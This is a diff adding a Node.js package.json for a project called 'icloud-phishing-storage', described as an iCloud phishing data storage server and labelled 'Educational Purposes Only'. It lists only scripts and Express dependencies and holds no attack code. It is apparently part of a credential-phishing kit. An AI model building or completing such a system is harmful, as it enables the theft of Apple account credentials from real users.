@@ -1,0 +1,33 @@
+{
+  "name": "icloud-phishing-storage",
+  "version": "1.0.0",
+  "description": "Advanced iCloud phishing data storage system",
+  "main": "storage-server.js",
+  "scripts": {
+    "start": "node storage-server.js",
+    "dev": "nodemon storage-server.js",
+    "test": "echo \"No tests specified\" && exit 0"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "cors": "^2.8.5",
+    "body-parser": "^1.20.2",
+    "morgan": "^1.10.0"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.1"
+  },
+  "keywords": [
+    "phishing",
+    "icloud",
+    "storage",
+    "security",
+    "educational"
+  ],
+  "author": "Educational Purposes Only",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/username/icloud-phishing-system"
+  }
+}
